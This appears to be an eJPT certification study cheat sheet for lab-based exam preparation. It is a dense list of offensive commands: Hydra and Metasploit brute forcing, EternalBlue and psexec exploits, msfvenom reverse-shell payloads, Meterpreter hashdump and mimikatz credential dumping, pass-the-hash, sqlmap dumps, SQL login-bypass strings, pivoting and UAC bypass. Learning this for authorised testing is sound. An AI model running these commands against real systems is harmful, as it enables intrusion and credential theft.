# 🎯 eJPT ULTIMATE CHEAT SHEET (2026 Updated - 45 Questions)
> Built from multiple GitHub cheat sheets, exam writeups, and people who scored 90%+

---

## ⚡ EXAM MINDSET — READ THIS FIRST

- Exam is **48 hours**, 45 questions, **open book**
- You hack real machines in a lab and answer MCQ based on what you find
- **Take notes constantly** — IP, open ports, credentials, flags found
- Start with **Nmap on all hosts** before doing anything else
- If stuck on a machine — **move to the next one**, come back later
- Passing score = **70% (32/45 questions)**. You want 40+ so stay focused.

---

## 📋 STEP 1 — YOUR WORKFLOW EVERY SINGLE TIME

```
1. Nmap scan → find all live hosts
2. Nmap service scan → find what's running on each host
3. For each host → enumerate based on open ports
4. Find credentials (SQLi / brute force / config files)
5. Exploit → get shell / meterpreter
6. Post exploitation → hashdump, sysinfo, pivot
7. Pivot to hidden networks if found
8. Answer the questions
```

---

## 🔍 STEP 2 — NMAP (MOST IMPORTANT TOOL)

### Host Discovery
```bash
# Find all live hosts in network
nmap -sn 10.10.10.0/24
fping -a -g 10.10.10.0/24 2>/dev/null
```

### Service & Version Scan (use this most)
```bash
# Best all-round scan
nmap -sV -sC 10.10.10.10

# Full port scan (all 65535 ports)
nmap -sV -sC -p- 10.10.10.10

# Aggressive scan (OS + version + scripts + traceroute)
nmap -A 10.10.10.10

# Save output to file
nmap -sV -sC 10.10.10.10 -oN scan.txt
```

### Vulnerability Scan
```bash
nmap -p <port> --script=vuln 10.10.10.10
```

### Specific Service Scripts
```bash
# FTP anonymous login check
nmap --script=ftp-anon 10.10.10.10 -p 21

# SMB vulnerability check (EternalBlue)
nmap -p445 --script=smb-vuln-* 10.10.10.10

# SMB enumeration
nmap -p445 --script smb-enum-shares,smb-enum-users 10.10.10.10

# HTTP enumeration
nmap --script http-enum -p 80 10.10.10.10

# MySQL info
nmap --script=mysql-info -p 3306 10.10.10.10

# SSH algorithms
nmap --script ssh2-enum-algos 10.10.10.10

# Heartbleed check
nmap -p 443 --script ssl-heartbleed 10.10.10.10

# SNMP (UDP!)
nmap -sU -p 161 10.10.10.10
```

### Important Nmap Flags
```
-sS    → SYN scan (stealth, fast)
-sT    → TCP connect scan
-sU    → UDP scan
-sV    → version detection
-sC    → default scripts
-sn    → ping scan (host discovery only)
-O     → OS detection
-A     → aggressive (all of the above)
-p-    → all 65535 ports
-Pn    → skip ping (assume host is up)
-T4    → faster timing
-oN    → save normal output
-oX    → save XML output
--open → show only open ports
```

---

## 🌐 STEP 3 — PORT TO ATTACK MAPPING

| Port | Service | What to do |
|------|---------|------------|
| 21 | FTP | Anonymous login, Hydra brute force |
| 22 | SSH | Hydra brute force, check version CVEs |
| 23 | Telnet | Banner grab, brute force |
| 25 | SMTP | User enumeration, sendemail |
| 80/443 | HTTP/HTTPS | Nikto, Gobuster, Burp, SQLmap |
| 139/445 | SMB | enum4linux, EternalBlue, smbclient |
| 1433 | MSSQL | Metasploit brute force, xp_cmdshell |
| 3306 | MySQL | Metasploit, mysql login |
| 3389 | RDP | Hydra brute force, xfreerdp |
| 5985/5986 | WinRM | evil-winrm, crackmapexec |
| 8080 | HTTP-alt | Same as port 80 |

---

## 🗂️ STEP 4 — ENUMERATION BY SERVICE

### FTP (Port 21)
```bash
# Check anonymous login
nmap --script=ftp-anon 10.10.10.10 -p 21

# Login manually
ftp 10.10.10.10
# Username: anonymous, Password: (blank or email)

# Brute force with Hydra
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 10.10.10.10 ftp

# Metasploit brute force
use auxiliary/scanner/ftp/ftp_login
set RHOST 10.10.10.10
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
run

# Check anonymous access
use auxiliary/scanner/ftp/anonymous
set RHOSTS 10.10.10.10
run
```

### SSH (Port 22)
```bash
# Brute force
hydra -l root -P /usr/share/wordlists/rockyou.txt 10.10.10.10 ssh
hydra -L users.txt -P passwords.txt 10.10.10.10 ssh

# Login
ssh user@10.10.10.10

# Metasploit brute force
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 10.10.10.10
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false
run
```

### SMB (Ports 139/445)
```bash
# Quick full enumeration
enum4linux -a 10.10.10.10

# List shares
smbclient -L //10.10.10.10/ -N       # null session
smbclient -L //10.10.10.10/ -U admin  # with user

# Connect to share
smbclient //10.10.10.10/share_name -U admin

# smbmap enumeration
smbmap -H 10.10.10.10
smbmap -H 10.10.10.10 -u admin -p password

# Nmap SMB scripts
nmap -p445 --script smb-enum-shares,smb-enum-users,smb-os-discovery 10.10.10.10
nmap -p445 --script smb-vuln-ms17-010 10.10.10.10

# Metasploit SMB version
use auxiliary/scanner/smb/smb_version
set RHOSTS 10.10.10.10
run

# Metasploit SMB brute force
use auxiliary/scanner/smb/smb_login
set RHOST 10.10.10.10
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false
run
```

### HTTP/HTTPS (Port 80/443)
```bash
# Web server fingerprint
whatweb 10.10.10.10
nikto -h http://10.10.10.10

# Directory brute force
gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirb/common.txt
gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
dirb http://10.10.10.10

# WordPress scan (NEW in 2026 exam!)
wpscan --url http://10.10.10.10
wpscan --url http://10.10.10.10 --enumerate u    # enumerate users
wpscan --url http://10.10.10.10 --enumerate p    # enumerate plugins

# Check robots.txt manually
curl http://10.10.10.10/robots.txt

# Metasploit HTTP
use auxiliary/scanner/http/http_version
set RHOSTS 10.10.10.10
run
```

### MySQL (Port 3306)
```bash
# Login
mysql -h 10.10.10.10 -u root
mysql -h 10.10.10.10 -u root -p

# SQL commands after login
show databases;
use database_name;
show tables;
select * from users;

# Metasploit
use auxiliary/scanner/mysql/mysql_login
set RHOSTS 10.10.10.10
set USERNAME root
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false
run

use auxiliary/scanner/mysql/mysql_hashdump
set RHOSTS 10.10.10.10
set USERNAME root
set PASSWORD password
run
```

### MSSQL (Port 1433)
```bash
# Nmap MSSQL info
nmap -p 1433 --script ms-sql-ntlm-info 10.10.10.10

# Empty password check
nmap -p 1433 --script ms-sql-empty-password 10.10.10.10

# Metasploit brute force
use auxiliary/scanner/mssql/mssql_login
set RHOSTS 10.10.10.10
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false
run

# Run commands via xp_cmdshell
use auxiliary/admin/mssql/mssql_exec
set RHOSTS 10.10.10.10
set USERNAME admin
set PASSWORD password
set CMD whoami
run
```

### RDP (Port 3389)
```bash
# Brute force
hydra -L users.txt -P passwords.txt rdp://10.10.10.10

# Connect
xfreerdp /u:administrator /p:password /v:10.10.10.10

# Metasploit scanner
use auxiliary/scanner/rdp/rdp_scanner
set RHOST 10.10.10.10
run

# BlueKeep check
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
set RHOST 10.10.10.10
run
```

### WinRM (Port 5985/5986)
```bash
# evil-winrm
evil-winrm -u administrator -p password -i 10.10.10.10

# crackmapexec brute force
crackmapexec winrm 10.10.10.10 -u administrator -P passwords.txt

# Metasploit
use auxiliary/scanner/winrm/winrm_login
set RHOSTS 10.10.10.10
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
run
```

---

## 💥 STEP 5 — EXPLOITATION

### Metasploit Workflow
```bash
msfconsole

# Search for exploit
search vsftpd
search eternalblue
search ms17-010
search wordpress

# Use module
use exploit/windows/smb/ms17_010_eternalblue
show options
set RHOSTS 10.10.10.10
set LHOST 10.10.10.5    # your attack machine IP
exploit
```

### Common Exploits
```bash
# EternalBlue (MS17-010) — Windows SMB
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.10
set LHOST your_ip
exploit

# VSFTPD 2.3.4 backdoor
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST 10.10.10.10
exploit

# Samba
use exploit/linux/samba/is_known_pipename
set RHOST 10.10.10.10
exploit

# Rejetto HFS (HTTP File Server)
use exploit/windows/http/rejetto_hfs_exec
set RHOST 10.10.10.10
exploit

# PSExec (when you have SMB creds)
use exploit/windows/smb/psexec
set RHOST 10.10.10.10
set SMBUser administrator
set SMBPass password
exploit

# WordPress exploitation
use exploit/unix/webapp/wp_admin_shell_upload
set RHOSTS 10.10.10.10
set USERNAME admin
set PASSWORD password
set TARGETURI /wordpress/
exploit
```

### msfvenom Payloads
```bash
# Windows reverse shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=your_ip LPORT=4444 -f exe > shell.exe

# PHP reverse shell
msfvenom -p php/meterpreter_reverse_tcp LHOST=your_ip LPORT=4444 -f raw > shell.php

# Linux reverse shell
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=your_ip LPORT=4444 -f elf > shell.elf

# Set up listener for any of the above
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST your_ip
set LPORT 4444
run
```

---

## 🖥️ STEP 6 — METERPRETER (POST EXPLOITATION)

### Essential Meterpreter Commands
```bash
sysinfo           # OS, hostname, architecture
getuid            # who are you logged in as
getpid            # current process ID
ps                # list all running processes
pwd               # current directory
ls                # list files

# Privilege Escalation
getsystem         # auto escalate to SYSTEM (Windows)
getprivs          # list privileges

# Network
ifconfig          # network interfaces (find hidden networks!)
route             # routing table
arp               # ARP table

# Files
search -f *.txt   # search for txt files
search -f flag*   # find flags
download file.txt # download a file
upload file.exe   # upload a file

# Hashes (need admin/SYSTEM)
hashdump          # dump all password hashes (SAM DB)

# Shell
shell             # drop to native OS shell

# Session management
background        # background this session (Ctrl+Z)
sessions -l       # list all sessions
sessions -i 1     # interact with session 1

# Migrate process
migrate <pid>     # migrate to another process
pgrep explorer    # find explorer process ID
```

### Kiwi (Mimikatz in Meterpreter)
```bash
load kiwi
creds_all          # dump all credentials
lsa_dump_sam       # dump SAM hashes
lsa_dump_secrets   # dump LSA secrets
```

### Post Exploitation Modules
```bash
# Privilege suggestions
use post/multi/recon/local_exploit_suggester
set SESSION 1
run

# Windows privileges
use post/windows/gather/win_privs
set SESSION 1
run

# Enable RDP
use post/windows/manage/enable_rdp
set SESSION 1
run

# Hash dump
use post/windows/gather/hashdump
set SESSION 1
run

# Linux hash dump
use post/linux/gather/hashdump
set SESSION 1
run
```

---

## 🔑 STEP 7 — PASSWORD ATTACKS

### Hydra (Brute Force)
```bash
# SSH
hydra -l root -P /usr/share/wordlists/rockyou.txt 10.10.10.10 ssh
hydra -L users.txt -P passwords.txt 10.10.10.10 ssh

# FTP
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.10 ftp

# HTTP POST form
hydra 10.10.10.10 http-post-form "/login.php:user=^USER^&password=^PASS^:Invalid credentials" -L users.txt -P passwords.txt -f -V

# SMB
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.10 smb

# RDP
hydra -L users.txt -P passwords.txt rdp://10.10.10.10

# MySQL
hydra -l root -P /usr/share/wordlists/rockyou.txt 10.10.10.10 mysql
```

### CrackMapExec
```bash
# SMB enumeration
crackmapexec smb 10.10.10.10
crackmapexec smb 10.10.10.10 -u admin -p password

# SMB brute force
crackmapexec smb 10.10.10.10 -u users.txt -p passwords.txt

# Pass the hash
crackmapexec smb 10.10.10.10 -u Administrator -H "NTLM_HASH" -x "whoami"

# WinRM
crackmapexec winrm 10.10.10.10 -u admin -p password
```

### Hash Cracking
```bash
# John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5 hashes.txt

# Unshadow (Linux)
unshadow /etc/passwd /etc/shadow > unshadowed.txt
john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt

# Hashcat
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt    # MD5
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt  # NTLM
```

---

## 💉 STEP 8 — SQL INJECTION

### SQLMap
```bash
# Basic GET parameter
sqlmap -u "http://10.10.10.10/page.php?id=1"

# Find databases
sqlmap -u "http://10.10.10.10/page.php?id=1" --dbs

# Find tables in database
sqlmap -u "http://10.10.10.10/page.php?id=1" -D dbname --tables

# Dump table data (find credentials here!)
sqlmap -u "http://10.10.10.10/page.php?id=1" -D dbname -T users --dump

# POST request SQLi
sqlmap -u "http://10.10.10.10/login.php" --data="user=admin&password=admin"
sqlmap -u "http://10.10.10.10/login.php" --data="user=admin&password=admin" --dbs

# From saved request file (Burp)
sqlmap -r request.txt
sqlmap -r request.txt --dbs
```

### Manual Login Bypass
```
' OR '1'='1
' OR 1=1 --
admin'--
' OR 'x'='x
```

---

## 🌍 STEP 9 — WEB APPLICATION TESTING (NEW 2026)

### Nikto
```bash
# Basic web server scan
nikto -h http://10.10.10.10
nikto -h http://10.10.10.10 -p 8080
nikto -h http://10.10.10.10 -o results.txt
```

### Gobuster
```bash
# Directory brute force
gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirb/common.txt

# With file extensions
gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,bak

# Ignore error codes
gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirb/common.txt -b 403,404
```

### WordPress (WPScan) — NEW in 2026!
```bash
# Basic scan
wpscan --url http://10.10.10.10

# Enumerate users
wpscan --url http://10.10.10.10 --enumerate u

# Enumerate plugins (find vulnerable ones)
wpscan --url http://10.10.10.10 --enumerate p

# Brute force WordPress login
wpscan --url http://10.10.10.10 --usernames admin --passwords /usr/share/wordlists/rockyou.txt

# After getting wp-admin access → Metasploit
use exploit/unix/webapp/wp_admin_shell_upload
```

### Finding Hidden Files
```bash
# Always check these manually
curl http://10.10.10.10/robots.txt
curl http://10.10.10.10/.htaccess
curl http://10.10.10.10/wp-config.php
curl http://10.10.10.10/config.php
curl http://10.10.10.10/.env
```

---

## 🔄 STEP 10 — PIVOTING (DON'T SKIP THIS!)

Pivoting = using a compromised machine to attack machines you can't reach directly

### Detect Hidden Networks
```bash
# In meterpreter
ifconfig     # look for multiple network interfaces!
route        # routing table

# If you see eth0: 10.10.10.5 AND eth1: 172.16.0.1
# The machine is connected to TWO networks
# eth1 is your pivot point into 172.16.0.0 network
```

### Metasploit Autoroute (Easiest Method)
```bash
# Inside meterpreter session
run autoroute -s 172.16.0.0/24    # add route to hidden network

# Background the session
background

# Now scan the hidden network through the pivot
use auxiliary/scanner/portscan/tcp
set RHOSTS 172.16.0.0/24
set PORTS 1-1000
run
```

### Port Forwarding
```bash
# Inside meterpreter
portfwd add -l 1234 -p 80 -r 172.16.0.10
# Now localhost:1234 = 172.16.0.10:80

# Scan the forwarded port
nmap -sV -p 1234 localhost
```

### Linux Route (Manual)
```bash
ip route add 172.16.0.0/24 via 10.10.10.5 dev eth0
ip route    # verify route was added
```

### ProxyChains + Socks Proxy
```bash
# In Metasploit
use auxiliary/server/socks_proxy
set SRVPORT 9050
set VERSION 4a
exploit

# Then run any command through it
proxychains nmap 172.16.0.10 -sT -Pn -p 445
proxychains curl http://172.16.0.10
```

---

## 🔓 STEP 11 — PRIVILEGE ESCALATION

### Windows
```bash
# In meterpreter
getsystem            # try auto escalation first

# Check privileges
getprivs
use post/windows/gather/win_privs
set SESSION 1
run

# Exploit suggester
use post/multi/recon/local_exploit_suggester
set SESSION 1
run

# Bypass UAC
use exploit/windows/local/bypassuac_injection
set SESSION 1
set TARGET x64
run

# After UAC bypass → run getsystem again
```

### Linux
```bash
# Check who you are
whoami
id

# Find SUID binaries
find / -perm -u=s -type f 2>/dev/null

# Check sudo permissions
sudo -l

# Check kernel version (for kernel exploits)
uname -r
cat /etc/issue

# Check cron jobs
crontab -l
cat /etc/crontab

# Linux exploit suggester (upload to target)
use post/linux/gather/enum_protections
set SESSION 1
run
```

---

## 🔍 STEP 12 — INFORMATION GATHERING (OSINT - NEW 2026)

### Passive Recon (don't touch the target)
```bash
# DNS info
whois target.com
dnsrecon -d target.com
dnsenum target.com

# Find subdomains
sublist3r -d target.com

# Find emails and names
theharvester -d target.com -b google,linkedin

# DNS zone transfer
dig axfr @nameserver target.com

# WAF detection
wafw00f http://target.com

# Check IP of website
host target.com
```

### Google Dorking
```
site:target.com                         # search within site
site:target.com inurl:admin             # find admin pages
site:*.target.com                       # find subdomains
site:target.com filetype:pdf            # find files
intitle:"index of"                      # directory listing
inurl:wp-config.bak                     # WordPress backup files
cache:target.com                        # cached version
```

---

## 🖥️ STEP 13 — USEFUL COMMANDS INSIDE SHELLS

### Linux (after getting shell)
```bash
whoami; id; hostname
cat /etc/passwd
cat /etc/shadow    # need root
uname -a
ifconfig / ip a
netstat -antup
ps aux
find / -name "flag*" 2>/dev/null
find / -name "*.txt" 2>/dev/null
cat /var/www/html/config.php    # web config files often have DB passwords
```

### Windows (after getting shell)
```cmd
whoami
hostname
systeminfo
ipconfig /all
netstat -ano
net users
net user administrator
route print
dir /b/s "flag*"
dir /b/s "*.txt"
type C:\flag.txt
```

---

## 📌 QUICK REFERENCE — COMMON PORTS

| Port | Protocol | Service |
|------|----------|---------|
| 21 | TCP | FTP |
| 22 | TCP | SSH |
| 23 | TCP | Telnet |
| 25 | TCP | SMTP |
| 53 | TCP/UDP | DNS |
| 67/68 | UDP | DHCP |
| 80 | TCP | HTTP |
| 110 | TCP | POP3 |
| 139 | TCP | NetBIOS |
| 143 | TCP | IMAP |
| 161 | UDP | SNMP |
| 443 | TCP | HTTPS |
| 445 | TCP | SMB |
| 1433 | TCP | MSSQL |
| 3306 | TCP | MySQL |
| 3389 | TCP | RDP |
| 5985 | TCP | WinRM (HTTP) |
| 5986 | TCP | WinRM (HTTPS) |
| 8080 | TCP | HTTP-alt |

---

## 🧠 SUBNETTING QUICK REF

| CIDR | Subnet Mask | Usable Hosts |
|------|------------|--------------|
| /8 | 255.0.0.0 | ~16 million |
| /16 | 255.255.0.0 | 65,534 |
| /24 | 255.255.255.0 | 254 |
| /25 | 255.255.255.128 | 126 |
| /30 | 255.255.255.252 | 2 |

**Rule:** Same network = first N octets match (N = slash/8)
- /8 → compare 1st octet
- /16 → compare 1st and 2nd octet
- /24 → compare 1st, 2nd and 3rd octet

---

## 💡 EXAM TIPS FROM PEOPLE WHO PASSED

1. **Nmap everything first** before touching any other tool
2. **Take notes in a separate file** — every IP, every open port, every credential you find
3. **Enumerate SMB deeply** — it always has something useful (enum4linux is your friend)
4. **Check for anonymous FTP** — people forget this and miss easy points
5. **WordPress = WPScan first** then exploit with Metasploit
6. **Always run `ifconfig` in meterpreter** — look for hidden networks to pivot into
7. **If a web server is found, run both Nikto AND Gobuster** — they find different things
8. **Check robots.txt and config files** — credentials are often just sitting there in plaintext
9. **Don't spend more than 30 minutes stuck** — move to next question, come back later
10. **Autoroute + TCP portscan** is the fastest way to enumerate after pivoting
11. **Background sessions with Ctrl+Z** — don't close them, you'll need them again
12. **SQLmap --dump** = gold for finding credentials in web app databases

---

## 🗝️ WORDLISTS LOCATION

```bash
/usr/share/wordlists/rockyou.txt                                # main password list
/usr/share/wordlists/dirb/common.txt                            # web directories
/usr/share/metasploit-framework/data/wordlists/common_users.txt # usernames
/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt # passwords
/usr/share/metasploit-framework/data/wordlists/root_userpass.txt  # user:pass combos
/usr/share/seclists/                                            # massive collection
```

---

*Good luck — you've got this! 💪*